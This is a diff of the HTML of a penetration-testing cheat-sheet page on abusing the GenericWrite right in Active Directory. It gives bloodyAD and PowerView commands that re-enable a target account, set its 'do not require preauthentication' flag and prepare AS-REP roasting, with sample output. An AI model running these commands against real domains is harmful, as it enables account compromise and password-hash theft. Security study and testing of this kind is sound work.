@@ -1,199 +1,168 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
-    <meta charset="utf-8">
+<!DOCTYPE html><html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant="" defer=""></script>
+<meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<title>GenericWrite | TLDRBins</title>
-<meta name="robots" content='index, follow'>
+<meta name="robots" content="index, follow">
 <meta name="description" content="">
-<meta name="generator" content="hugo-index">
+<title>GenericWrite | TLDRBins</title>
 <link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
-<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
-<script>
-    window.addEventListener('load', () => {
-        quicklink.listen();
-    });
-</script>
-
-  </head>
-  <body><header>
+</head>
+<body>
+<header>
   <h1>
     <a href="https://tldrbins.github.io/">
       <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
       <span>TLDRBins</span>
-    </a>
-    <span class="hl">/</span>
-    <a href="https://tldrbins.github.io/genericwrite/">
-      <span>GenericWrite</span>
-    </a>
-  </h1>
-  <div class="js-toggle-wrapper">
-    <div class="js-toggle">
-        <div class="js-toggle-track">
-            <div class="js-toggle-track-check">
-                <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
-            </div>
-            <div class="js-toggle-track-x">
-                <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
-            </div>
+    </a><span class="hl"> / </span>
+    <a href="https://tldrbins.github.io/genericwrite/"><span>GenericWrite</span></a></h1>
+  <div class="theme-toggle-wrapper">
+    <div class="theme-toggle">
+      <div class="theme-toggle-track">
+        <div class="theme-toggle-track-dark">
+          <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
         </div>
-        <div class="js-toggle-thumb"></div>
-        <input class="js-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
+        <div class="theme-toggle-track-light">
+          <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
+        </div>
+      </div>
+      <div class="theme-toggle-thumb"></div>
+      <input class="theme-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
     </div>
-</div>
-    
-<style>
- 
+  </div>
+  <style>
+  .theme-toggle-wrapper, .theme-toggle {
+      margin: 0;
+      padding: 0;
+      border: 0;
+      box-sizing: border-box;
+  }
 
- 
-.js-toggle-wrapper, .js-toggle {
-    margin: 0;
-    padding: 0;
-    border: 0;
-    box-sizing: border-box;
-}
+  .theme-toggle-wrapper {
+      display: table;
+      float: right;
+      margin-left: auto;
+  }
 
-.js-toggle-wrapper {
-    display: table;
-    float: right;
-    margin-left: auto;
-}
+  .theme-toggle {
+      touch-action: pan-x;
+      display: inline-block;
+      position: relative;
+      cursor: pointer;
+      background-color: transparent;
+      user-select: none;
+  }
 
-.js-toggle {
-    touch-action: pan-x;
-    display: inline-block;
-    position: relative;
-    cursor: pointer;
-    background-color: transparent;
-    user-select: none;
-}
+  .theme-toggle-screenreader-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      margin: -1px;
+      padding: 0;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+  }
 
-.js-toggle-screenreader-only {
-    position: absolute;
-    width: 1px;
-    height: 1px;
-    margin: -1px;
-    padding: 0;
-    overflow: hidden;
-    clip: rect(0, 0, 0, 0);
-}
+  .theme-toggle-track {
+      width: 50px;
+      height: 24px;
+      border-radius: 30px;
+      background-color: hsl(223, 61%, 44%);
+      transition: background-color 0.2s ease;
+  }
 
-.js-toggle-track {
-    width: 50px;
-    height: 24px;
-    border-radius: 30px;
-    background-color: hsl(223, 61%, 44%);
-    transition: background-color 0.2s ease;
-}
+  .theme-toggle-track-dark,
+  .theme-toggle-track-light {
+      position: absolute;
+      width: 17px;
+      height: 17px;
+      top: 50%;
+      transform: translateY(-50%);
+      transition: opacity 0.25s ease;
+  }
 
-.js-toggle-track-check,
-.js-toggle-track-x {
-    position: absolute;
-    width: 17px;
-    height: 17px;
-    top: 50%;
-    transform: translateY(-50%);
-    transition: opacity 0.25s ease;
-}
+  .theme-toggle-track-dark {
+      left: 5px;
+      opacity: 0;
+  }
 
-.js-toggle-track-check {
-    left: 5px;
-    opacity: 0;
-}
+  .theme-toggle--checked .theme-toggle-track-dark {
+      opacity: 1;
+  }
 
-.js-toggle--checked .js-toggle-track-check {
-    opacity: 1;
-}
+  .theme-toggle-track-light {
+      right: 5px;
+      opacity: 1;
+  }
 
-.js-toggle-track-x {
-    right: 5px;
-    opacity: 1;
-}
+  .theme-toggle--checked .theme-toggle-track-light {
+      opacity: 0;
+  }
 
-.js-toggle--checked .js-toggle-track-x {
-    opacity: 0;
-}
+  .theme-toggle--checked .theme-toggle-track {
+      background-color: hsl(222, 14%, 7%);
+  }
 
-.js-toggle--checked .js-toggle-track {
-    background-color: hsl(222, 14%, 7%);
-}
+  .theme-toggle-thumb {
+      position: absolute;
+      top: 1px;
+      left: 1px;
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background-color: #fafafa;
+      transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+  }
 
-.js-toggle-thumb {
-    position: absolute;
-    top: 1px;
-    left: 1px;
-    width: 22px;
-    height: 22px;
-    border-radius: 50%;
-    background-color: #fafafa;
-    transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
-}
+  .theme-toggle--checked .theme-toggle-thumb {
+      transform: translateX(26px);
+  }
+  </style>
+  <script>
+      const body = document.body;
+      const themeSwitcher = document.querySelector('.theme-toggle');      
 
-.js-toggle--checked .js-toggle-thumb {
-    transform: translateX(26px);
-}
-</style>
+      themeSwitcher.addEventListener('click', () => {
+          const isDarkMode = themeSwitcher.classList.toggle('theme-toggle--checked');
+          body.classList.toggle('dark-mode', isDarkMode);
+          if (isDarkMode) {
+              localStorage.setItem('darkMode', 'true');
+          } else {
+              localStorage.removeItem('darkMode');
+          }
+      });      
 
-<script>
-    var body = document.body;
-    var switcher = document.getElementsByClassName('js-toggle')[0];
-
-    
-    switcher.addEventListener("click", function() {
-        this.classList.toggle('js-toggle--checked');
-        
-        if (this.classList.contains('js-toggle--checked')) {
-            body.classList.add('dark-mode');
-            
-            localStorage.setItem('darkMode', 'true');
-        } else {
-            body.classList.remove('dark-mode');
-            setTimeout(function() {
-                localStorage.removeItem('darkMode');
-            }, 100);
-        }
-    })
-
-    
-    if (localStorage.getItem('darkMode')) {
-        
-        switcher.classList.add('js-toggle--checked');
-        body.classList.add('dark-mode');
-    }
-</script>
+      if (localStorage.getItem('darkMode')) {
+          themeSwitcher.classList.add('theme-toggle--checked');
+          body.classList.add('dark-mode');
+      }
+  </script>
   <p class="desc"></p>
 </header>
-<div class="main">
-
+<main>
 <ul class="tagsList single">
-  
   <li><a href="https://tldrbins.github.io/@shadow-credentials/">Shadow Credentials</a></li>
-  
   <li><a href="https://tldrbins.github.io/@pass-the-ticket/">Pass-the-Ticket</a></li>
-  
   <li><a href="https://tldrbins.github.io/@kerberoasting/">Kerberoasting</a></li>
-  
   <li><a href="https://tldrbins.github.io/@genericwrite/">Genericwrite</a></li>
-  
   <li><a href="https://tldrbins.github.io/@powerview/">Powerview</a></li>
-  
   <li><a href="https://tldrbins.github.io/@asreproast/">Asreproast</a></li>
-  
   <li><a href="https://tldrbins.github.io/@credential-dumping/">Credential Dumping</a></li>
-  
   <li><a href="https://tldrbins.github.io/@ticket-granting-ticket/">Ticket Granting Ticket</a></li>
-  
   <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
-  
   <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
-  
 </ul>
 <hr>
 <div class="content">
+  <div class="tips">
+  <p><strong>Usage Tips:</strong></p>
+  <ul>
+    <li>Click inside a code block to copy (excludes comments).</li>
+    <li>Use the <strong><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -6 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></strong> button to view examples.</li>
+    <li>Click outside to collapse all examples.</li>
+  </ul>
+</div>
   <div id="dynamicFormContainer">
-	<form id="dynamicForm" style="display: none;">
-	</form>
+	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="COM">COM: </label><input type="text" name="COM"></div><div class="input-group"><label for="DC_IP">DC IP: </label><input type="text" name="DC_IP"></div><div class="input-group"><label for="DC">DC: </label><input type="text" name="DC"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="EXAMPLE">EXAMPLE: </label><input type="text" name="EXAMPLE"></div><div class="input-group"><label for="GROUP">GROUP: </label><input type="text" name="GROUP"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="SERVICE_PORT">SERVICE PORT: </label><input type="text" name="SERVICE_PORT"></div><div class="input-group"><label for="SERVICE">SERVICE: </label><input type="text" name="SERVICE"></div><div class="input-group"><label for="TARGET_COMPUTER">TARGET COMPUTER: </label><input type="text" name="TARGET_COMPUTER"></div><div class="input-group"><label for="TARGET_DOMAIN">TARGET DOMAIN: </label><input type="text" name="TARGET_DOMAIN"></div><div class="input-group"><label for="TARGET_GROUP">TARGET GROUP: </label><input type="text" name="TARGET_GROUP"></div><div class="input-group"><label for="TARGET_USER">TARGET USER: </label><input type="text" name="TARGET_USER"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div></form>
 	<div class="buttons center">
 		<button id="form_btn">Show Params Form</button>
 		<button id="replace_btn" style="display: none;">Replace Params</button>
@@ -201,7 +170,6 @@
 		<button id="clear_btn" style="display: none;">Clear Cache</button>
 	</div>
 </div>
-
 <style>
 #dynamicFormContainer {
 	width: 100%;
@@ -333,91 +301,110 @@ body.dark-mode #dynamicFormContainer button:hover {
 }
 </style>
   <h3 id="abuse-1--add-uf_dont_require_preauth-bit-to-target-user">Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to Target User</h3>
-<p>
-<button data-tabset="set1" data-tabcontent="tab1" >Linux</button>
+<p class="tabs">
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
 
-<button data-tabset="set1" data-tabcontent="tab2" >Windows</button>
+<button data-tabset="set1" data-tabcontent="tab2">Windows</button>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Enable Account <span class="o">(</span><span class="k">if</span> Disabled<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC_IP&gt; &amp;&amp; bloodyAD --host &lt;DC&gt; -d &#34;&lt;DOMAIN&gt;&#34; --dc-ip &lt;DC_IP&gt; -k remove uac &lt;TARGET_USER&gt; -f ACCOUNTDISABLE
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC_IP&gt; &amp;&amp; bloodyAD --host &lt;DC&gt; -d &#34;&lt;DOMAIN&gt;&#34; --dc-ip &lt;DC_IP&gt; -k add uac &lt;TARGET_USER&gt; -f DONT_REQ_PREAUTH
-</span></span></span></code></pre></div></div>
-
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-import-powerview">1. Import PowerView</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; . .\PowerView.ps1
+</p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Enable Account <span class="o">(</span><span class="k">if</span> Disabled<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o">&lt;DC_IP&gt;</span> &amp;&amp; bloodyAD --host <span class="o">&lt;DC&gt;</span> -d "<span class="o">&lt;DOMAIN&gt;</span>" --dc-ip <span class="o">&lt;DC_IP&gt;</span> -k remove uac <span class="o">&lt;TARGET_USER&gt;</span> -f ACCOUNTDISABLE
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o">&lt;DC_IP&gt;</span> &amp;&amp; bloodyAD --host <span class="o">&lt;DC&gt;</span> -d "<span class="o">&lt;DOMAIN&gt;</span>" --dc-ip <span class="o">&lt;DC_IP&gt;</span> -k add uac <span class="o">&lt;TARGET_USER&gt;</span> -f DONT_REQ_PREAUTH
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div></div><div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-import-powerview">1. Import PowerView</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; . .\PowerView.ps1
 </span></span></span><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
-</span></span></span></code></pre></div><h4 id="2-check-target-user">2. Check Target User</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainUser &#39;&lt;TARGET_USER&gt;&#39; | ConvertFrom-UACValue
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Get-DomainUser &#39;user&#39; | ConvertFrom-UACValue
-</span></span></span><span class="line"><span class="cl"><span class="go">Get-DomainUser &#39;user&#39; | ConvertFrom-UACValue
+</span></span></span></div></pre></div><h4 id="2-check-target-user">2. Check Target User</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainUser '<span class="o">&lt;TARGET_USER&gt;</span>' | ConvertFrom-UACValue
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Get-DomainUser 'user' | ConvertFrom-UACValue
+</span></span></span><span class="line"><span class="cl"><span class="go">Get-DomainUser 'user' | ConvertFrom-UACValue
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Name                           Value                                           
 </span></span></span><span class="line"><span class="cl"><span class="go">----                           -----                                           
 </span></span></span><span class="line"><span class="cl"><span class="go">NORMAL_ACCOUNT                 512
-</span></span></span></code></pre></div><h4 id="3-create-a-cred-object-runas-optional">3. Create a Cred Object (runas) [Optional]</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;USER&gt;&#39;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span> -AsPlainText -Force
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
-</span></span></code></pre></div><h4 id="4-add-uf_dont_require_preauth-bit">4. Add UF_DONT_REQUIRE_PREAUTH bit</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Set-DomainObject -Identity &#39;&lt;TARGET_USER&gt;&#39; -XOR @{useraccountcontrol=4194304} -Verbose -Credential $Cred
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Set-DomainObject -Identity &#39;user&#39; -XOR @{useraccountcontrol=4194304} -Verbose  -C
-</span></span></span><span class="line"><span class="cl"><span class="go">Set-DomainObject -Identity &#39;user&#39; -XOR @{useraccountcontrol=4194304} -Verbose  -Credential $Cred
+</span></span></span></div></pre></div><h4 id="3-create-a-cred-object-runas-optional">3. Create a Cred Object (runas) [Optional]</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">'<span class="o">&lt;DOMAIN&gt;</span>\<span class="o">&lt;USER&gt;</span>'</span>
+</span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'<span class="o">&lt;PASSWORD&gt;</span>'</span> -AsPlainText -Force
+</span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
+</span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="4-add-uf_dont_require_preauth-bit">4. Add UF_DONT_REQUIRE_PREAUTH bit</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Set-DomainObject -Identity '<span class="o">&lt;TARGET_USER&gt;</span>' -XOR @{useraccountcontrol=4194304} -Verbose -Credential $Cred
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Set-DomainObject -Identity 'user' -XOR @{useraccountcontrol=4194304} -Verbose  -C
+</span></span></span><span class="line"><span class="cl"><span class="go">Set-DomainObject -Identity 'user' -XOR @{useraccountcontrol=4194304} -Verbose  -Credential $Cred
 </span></span></span><span class="line"><span class="cl"><span class="go">VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
-</span></span></span><span class="line"><span class="cl"><span class="go">VERBOSE: [Get-Domain] Extracted domain &#39;corp.local&#39; from -Credential
+</span></span></span><span class="line"><span class="cl"><span class="go">VERBOSE: [Get-Domain] Extracted domain 'corp.local' from -Credential
 </span></span></span><span class="line"><span class="cl"><span class="go">VERBOSE: [Get-DomainSearcher] search base: 
 </span></span></span><span class="line"><span class="cl"><span class="go">LDAP://DC01.corp.local/DC=corp,DC=local
 </span></span></span><span class="line"><span class="cl"><span class="go">VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
 </span></span></span><span class="line"><span class="cl"><span class="go">VERBOSE: [Get-DomainObject] Get-DomainObject filter string: 
 </span></span></span><span class="line"><span class="cl"><span class="go">(&amp;(|(|(samAccountName=user)(name=user)(displayname=user))))
-</span></span></span><span class="line"><span class="cl"><span class="go">VERBOSE: [Set-DomainObject] XORing &#39;useraccountcontrol&#39; with &#39;4194304&#39; for 
-</span></span></span><span class="line"><span class="cl"><span class="go">object &#39;user&#39;
-</span></span></span></code></pre></div><h4 id="5-as-rep-roasting">5. AS-REP Roasting</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In <span class="nb">local</span> linux machine
-</span></span><span class="line"><span class="cl"><span class="go">impacket-GetNPUsers &#39;&lt;DOMAIN&gt;/&lt;TARGET_USER&gt;&#39; -no-pass -dc-ip &lt;DC&gt;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-GetNPUsers <span class="s1">&#39;corp.local/user&#39;</span> -no-pass -dc-ip 172.16.1.5
+</span></span></span><span class="line"><span class="cl"><span class="go">VERBOSE: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for 
+</span></span></span><span class="line"><span class="cl"><span class="go">object 'user'
+</span></span></span></div></pre></div><h4 id="5-as-rep-roasting">5. AS-REP Roasting</h4>
